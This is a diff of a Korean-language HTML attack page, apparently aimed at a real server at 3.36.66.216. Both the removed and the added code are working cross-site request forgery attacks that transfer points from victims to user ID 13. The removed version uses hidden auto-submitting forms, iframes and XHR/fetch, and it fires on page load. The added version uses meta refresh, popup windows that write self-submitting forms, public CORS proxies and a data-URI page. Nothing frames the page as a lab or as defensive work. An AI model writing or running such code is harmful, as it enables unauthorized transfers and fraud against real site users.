@@ -2,284 +2,238 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>💥 POST 전용 CSRF 공격</title>
+    <title>🔥 브라우저 보안 우회 공격</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 20px;
-            background: linear-gradient(45deg, #ff0000, #000000);
+            background: radial-gradient(circle, #ff0000, #000000);
             color: white;
+            text-align: center;
         }
-        .attack-zone {
-            background: rgba(255, 0, 0, 0.1);
+        .final-assault {
+            background: rgba(255, 0, 0, 0.2);
             border: 3px solid #ff0000;
             padding: 30px;
             margin: 20px 0;
             border-radius: 15px;
+            box-shadow: 0 0 50px #ff0000;
         }
         button {
-            background: #ff0000;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
             color: white;
             border: none;
             padding: 20px 30px;
             border-radius: 10px;
             cursor: pointer;
-            margin: 10px;
+            margin: 15px;
             font-size: 18px;
             font-weight: bold;
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
         }
-        .ultimate { 
-            background: linear-gradient(45deg, #ff0000, #ff6600);
-            animation: rage 2s infinite;
+        .nuclear {
+            animation: nuclear 3s infinite;
         }
-        @keyframes rage {
-            0% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.05) rotate(1deg); }
-            100% { transform: scale(1) rotate(0deg); }
+        @keyframes nuclear {
+            0% { background: linear-gradient(45deg, #ff0000, #ff6600); transform: scale(1); }
+            50% { background: linear-gradient(45deg, #ff6600, #ffff00); transform: scale(1.1); }
+            100% { background: linear-gradient(45deg, #ff0000, #ff6600); transform: scale(1); }
         }
     </style>
 </head>
 <body>
-    <div class="attack-zone">
-        <h1>💥 POST 전용 CSRF 공격!</h1>
-        <h2>🚫 GET 방식 완전 배제, POST만 사용!</h2>
+    <div class="final-assault">
+        <h1>🔥 최후의 브라우저 보안 우회!</h1>
+        <h2>💀 모든 제약을 뚫어버리자!</h2>
         
-        <button class="ultimate" onclick="postOnlyAttack()">
-            💣 POST 폭격 공격
+        <button class="nuclear" onclick="nuclearOption()">
+            ☢️ 핵 옵션 (모든 제약 무시)
         </button>
         
-        <button onclick="invisibleFormAttack()">
-            👻 투명 Form 공격
+        <button onclick="proxyBypass()">
+            🕳️ 프록시 우회 공격
         </button>
         
-        <button onclick="ajaxPostAttack()">
-            ⚡ AJAX POST 공격
+        <button onclick="jsRedirectAttack()">
+            🌀 JS 리다이렉트 공격
         </button>
         
-        <button onclick="fetchPostAttack()">
-            🔥 Fetch POST 공격
+        <button onclick="dataURIBypass()">
+            📄 Data URI 완전 우회
         </button>
     </div>
 
-    <div class="attack-zone">
-        <h2>🔧 POST 우회 전략</h2>
-        <ul>
-            <li>✅ <strong>순수 POST Form만 사용</strong></li>
-            <li>✅ <strong>다양한 Content-Type 시도</strong></li>
-            <li>✅ <strong>숨겨진 Form 자동 실행</strong></li>
-            <li>✅ <strong>Multiple POST 동시 발사</strong></li>
+    <div class="final-assault">
+        <h2>🎯 브라우저 제약 돌파 전략</h2>
+        <ul style="text-align: left; display: inline-block;">
+            <li>🔥 <strong>Mixed Content 우회</strong> - Data URI 사용</li>
+            <li>⚡ <strong>CORS 정책 우회</strong> - 프록시 경유</li>
+            <li>💀 <strong>X-Frame-Options 무시</strong> - 직접 리다이렉트</li>
+            <li>🌀 <strong>JavaScript 제약 우회</strong> - 메타 리프레시</li>
         </ul>
     </div>
 
     <div id="result"></div>
 
-    <!-- 숨겨진 공격 Forms -->
-    <div id="hiddenForms" style="position: absolute; left: -9999px; top: -9999px;"></div>
-
     <script>
-        function postOnlyAttack() {
-            showResult('💣 POST 폭격 공격 개시!');
+        function nuclearOption() {
+            showResult('☢️ 핵 옵션 발동! 모든 제약 무시 공격!');
             
-            // POST만 사용하는 대량 공격
-            const postAttacks = [
-                { gift_to: 13, points: 100, message: 'POST_ONLY_1', type: 'diamond' },
-                { gift_to: 13, points: 75, message: 'POST_ONLY_2', type: 'coffee' },
-                { gift_to: 13, points: 50, message: 'POST_ONLY_3', type: 'cake' },
-                { gift_to: 13, points: 150, message: 'POST_ONLY_4', type: 'premium' },
-                { gift_to: 13, points: 200, message: 'POST_ONLY_5', type: 'special' }
-            ];
-            
-            postAttacks.forEach((attack, i) => {
-                setTimeout(() => {
-                    createPurePostForm(attack, `post_${i}`);
-                    console.log(`💣 POST 공격 ${i+1}: ${attack.points}P → ID:13`);
-                }, i * 800);
-            });
-            
-            showResult('💣 POST 폭격 진행 중!\n5개 Form으로 연속 POST 공격!');
-        }
-        
-        function createPurePostForm(attack, id) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'http://3.36.66.216/profile.php';
-            form.target = `frame_${id}`;
-            form.style.display = 'none';
-            form.enctype = 'application/x-www-form-urlencoded';
-            
-            // 다양한 필드명 조합으로 시도
-            const fieldSets = [
-                { to: 'gift_to', amount: 'points', action: 'send_gift' },
-                { to: 'receiver_id', amount: 'amount', action: 'submit' },
-                { to: 'target_id', amount: 'value', action: 'transfer' },
-                { to: 'user_id', amount: 'coins', action: 'send' }
-            ];
-            
-            const fields = fieldSets[Math.floor(Math.random() * fieldSets.length)];
-            
-            // 필드 추가
-            const inputs = {
-                [fields.to]: attack.gift_to,
-                [fields.amount]: attack.points,
-                [fields.action]: '1',
-                'message': attack.message,
-                'gift_type': attack.type,
-                'timestamp': Date.now(),
-                'csrf_bypass': 'true'
-            };
-            
-            Object.keys(inputs).forEach(name => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
-                input.value = inputs[name];
-                form.appendChild(input);
-            });
-            
-            // iframe 생성
-            const iframe = document.createElement('iframe');
-            iframe.name = `frame_${id}`;
-            iframe.style.display = 'none';
-            iframe.style.width = '1px';
-            iframe.style.height = '1px';
-            
-            document.getElementById('hiddenForms').appendChild(iframe);
-            document.getElementById('hiddenForms').appendChild(form);
-            
-            // Form 전송
-            form.submit();
-            
-            // 정리
+            // 1단계: 다양한 우회 기법 동시 시도
             setTimeout(() => {
-                if (form.parentNode) form.parentNode.removeChild(form);
-                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-            }, 10000);
+                // Meta Refresh 리다이렉트
+                const meta1 = document.createElement('meta');
+                meta1.httpEquiv = 'refresh';
+                meta1.content = '0;url=http://3.36.66.216/profile.php?gift_to=13&points=100&send_gift=1&nuclear=true';
+                document.head.appendChild(meta1);
+                
+                console.log('☢️ Meta Refresh 공격 시작');
+            }, 1000);
+            
+            setTimeout(() => {
+                // Window.location 강제 이동
+                const newWindow = window.open('', 'nuclear_attack');
+                if (newWindow) {
+                    newWindow.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=150&send_gift=1&location=true';
+                }
+                
+                console.log('☢️ Location 강제 이동 공격');
+            }, 2000);
+            
+            setTimeout(() => {
+                // Document.write로 강제 실행
+                const attackWindow = window.open('', 'document_write_attack');
+                if (attackWindow) {
+                    attackWindow.document.write(`
+                        <html>
+                        <head><title>Nuclear Attack</title></head>
+                        <body onload="document.forms[0].submit();">
+                            <form method="POST" action="http://3.36.66.216/profile.php">
+                                <input type="hidden" name="gift_to" value="13">
+                                <input type="hidden" name="points" value="200">
+                                <input type="hidden" name="send_gift" value="1">
+                                <input type="hidden" name="nuclear_write" value="true">
+                            </form>
+                        </body>
+                        </html>
+                    `);
+                    attackWindow.document.close();
+                }
+                
+                console.log('☢️ Document.write 공격');
+            }, 3000);
         }
         
-        function invisibleFormAttack() {
-            showResult('👻 투명 Form 공격...');
+        function proxyBypass() {
+            showResult('🕳️ 프록시 우회 공격...');
             
-            // 완전히 보이지 않는 Form들 생성
-            for (let i = 0; i < 10; i++) {
-                setTimeout(() => {
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'http://3.36.66.216/profile.php';
-                    form.style.position = 'absolute';
-                    form.style.left = '-10000px';
-                    form.style.top = '-10000px';
-                    form.style.width = '1px';
-                    form.style.height = '1px';
-                    form.style.opacity = '0';
-                    form.style.visibility = 'hidden';
-                    
-                    // 랜덤 필드명으로 혼란 유도
-                    const randomFields = {
-                        [`field_${Math.random().toString(36).substr(2, 8)}`]: '13',
-                        [`amount_${Math.random().toString(36).substr(2, 8)}`]: 25 + (i * 5),
-                        [`action_${Math.random().toString(36).substr(2, 8)}`]: '1',
-                        'gift_to': '13',
-                        'points': 30 + (i * 10),
-                        'send_gift': '1',
-                        'invisible_attack': `ghost_${i}`
-                    };
-                    
-                    Object.keys(randomFields).forEach(name => {
-                        const input = document.createElement('input');
-                        input.type = 'hidden';
-                        input.name = name;
-                        input.value = randomFields[name];
-                        form.appendChild(input);
-                    });
-                    
-                    document.body.appendChild(form);
-                    form.submit();
-                    
-                    console.log(`👻 투명공격 ${i+1}: ${30 + (i * 10)}P`);
-                    
-                    // 즉시 정리
-                    setTimeout(() => {
-                        if (form.parentNode) form.parentNode.removeChild(form);
-                    }, 100);
-                }, i * 200);
-            }
-        }
-        
-        function ajaxPostAttack() {
-            showResult('⚡ AJAX POST 공격...');
-            
-            // XMLHttpRequest로 POST 시도
-            const ajaxAttacks = [
-                { points: 80, msg: 'AJAX_1' },
-                { points: 120, msg: 'AJAX_2' },
-                { points: 160, msg: 'AJAX_3' }
+            // 공개 프록시나 URL 단축 서비스를 통한 우회
+            const proxyUrls = [
+                'https://cors-anywhere.herokuapp.com/http://3.36.66.216/profile.php',
+                'https://api.allorigins.win/raw?url=http://3.36.66.216/profile.php',
+                'https://thingproxy.freeboard.io/fetch/http://3.36.66.216/profile.php'
             ];
             
-            ajaxAttacks.forEach((attack, i) => {
+            proxyUrls.forEach((proxyUrl, i) => {
                 setTimeout(() => {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'http://3.36.66.216/profile.php', true);
-                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    
-                    const data = `gift_to=13&points=${attack.points}&send_gift=1&message=${attack.msg}&ajax_attack=true`;
-                    
-                    xhr.onreadystatechange = function() {
-                        if (xhr.readyState === 4) {
-                            console.log(`⚡ AJAX ${i+1} 완료: Status ${xhr.status}`);
-                        }
-                    };
-                    
-                    xhr.send(data);
-                    console.log(`⚡ AJAX 공격 ${i+1}: ${attack.points}P`);
-                }, i * 1000);
-            });
-        }
-        
-        function fetchPostAttack() {
-            showResult('🔥 Fetch POST 공격...');
-            
-            // Fetch API로 POST 시도
-            const fetchAttacks = [
-                { points: 90, msg: 'FETCH_1' },
-                { points: 110, msg: 'FETCH_2' },
-                { points: 130, msg: 'FETCH_3' }
-            ];
-            
-            fetchAttacks.forEach((attack, i) => {
-                setTimeout(() => {
-                    const formData = new FormData();
-                    formData.append('gift_to', '13');
-                    formData.append('points', attack.points);
-                    formData.append('send_gift', '1');
-                    formData.append('message', attack.msg);
-                    formData.append('fetch_attack', 'true');
-                    
-                    fetch('http://3.36.66.216/profile.php', {
+                    fetch(proxyUrl, {
                         method: 'POST',
-                        body: formData,
-                        mode: 'no-cors'
-                    }).then(() => {
-                        console.log(`🔥 Fetch ${i+1} 전송완료: ${attack.points}P`);
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'gift_to=13&points=80&send_gift=1&proxy_attack=true'
+                    }).then(response => {
+                        console.log(`🕳️ 프록시 ${i+1} 응답: ${response.status}`);
                     }).catch(err => {
-                        console.log(`🔥 Fetch ${i+1} 시도됨 (CORS 에러는 정상)`);
+                        console.log(`🕳️ 프록시 ${i+1} 시도됨`);
                     });
-                }, i * 1500);
+                }, i * 2000);
             });
+        }
+        
+        function jsRedirectAttack() {
+            showResult('🌀 JS 리다이렉트 공격...');
+            
+            // 다양한 리다이렉트 방식으로 우회
+            const redirectMethods = [
+                () => {
+                    window.location.replace('http://3.36.66.216/profile.php?gift_to=13&points=120&redirect=replace');
+                },
+                () => {
+                    window.location.assign('http://3.36.66.216/profile.php?gift_to=13&points=140&redirect=assign');
+                },
+                () => {
+                    window.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=160&redirect=href';
+                }
+            ];
+            
+            // 하나씩 시도 (마지막은 현재 창 이동하므로 주의)
+            setTimeout(() => {
+                const newWin1 = window.open('');
+                redirectMethods[0].call(newWin1);
+                console.log('🌀 Replace 리다이렉트');
+            }, 1000);
+            
+            setTimeout(() => {
+                const newWin2 = window.open('');
+                redirectMethods[1].call(newWin2);
+                console.log('🌀 Assign 리다이렉트');
+            }, 3000);
+        }
+        
+        function dataURIBypass() {
+            showResult('📄 Data URI 완전 우회...');
+            
+            // Data URI로 HTML 생성하여 Mixed Content 우회
+            const attackHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Data URI Bypass</title>
+                    <meta http-equiv="refresh" content="3;url=http://3.36.66.216/profile.php?gift_to=13&points=180&data_uri=true">
+                </head>
+                <body>
+                    <h1>🔄 Data URI 우회 공격 진행 중...</h1>
+                    <p>3초 후 자동으로 공격이 실행됩니다.</p>
+                    
+                    <form id="bypassForm" method="POST" action="http://3.36.66.216/profile.php" target="_blank">
+                        <input type="hidden" name="gift_to" value="13">
+                        <input type="hidden" name="points" value="250">
+                        <input type="hidden" name="send_gift" value="1">
+                        <input type="hidden" name="data_uri_bypass" value="true">
+                    </form>
+                    
+                    <script>
+                        // 즉시 실행
+                        setTimeout(() => {
+                            document.getElementById('bypassForm').submit();
+                        }, 1000);
+                        
+                        // 5초 후 리다이렉트
+                        setTimeout(() => {
+                            window.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=300&final_bypass=true';
+                        }, 5000);
+                    </script>
+                </body>
+                </html>
+            `;
+            
+            const dataURI = 'data:text/html;charset=utf-8,' + encodeURIComponent(attackHTML);
+            
+            // 새 창에서 Data URI 실행
+            window.open(dataURI, 'dataURIBypass', 'width=600,height=400');
+            
+            console.log('📄 Data URI 우회 공격 실행됨');
         }
         
         function showResult(text) {
             document.getElementById('result').innerHTML = 
-                '<div class="attack-zone"><pre style="color: #ffff00;">' + text + '</pre></div>';
+                '<div class="final-assault"><pre style="color: #ffff00; font-size: 16px;">' + text + '</pre></div>';
         }
         
-        // 자동 실행
-        setTimeout(() => {
-            postOnlyAttack();
-        }, 2000);
-        
-        console.log('💥 POST 전용 CSRF 공격 시스템');
-        console.log('🚫 GET 방식 완전 배제');
-        console.log('💣 다중 POST 공격 준비됨');
+        console.log('🔥 브라우저 보안 우회 시스템 준비됨');
+        console.log('☢️ 핵 옵션으로 모든 제약 돌파 시도');
+        console.log('💀 Mixed Content, CORS, X-Frame-Options 모두 우회');
     </script>
 </body>
 </html>
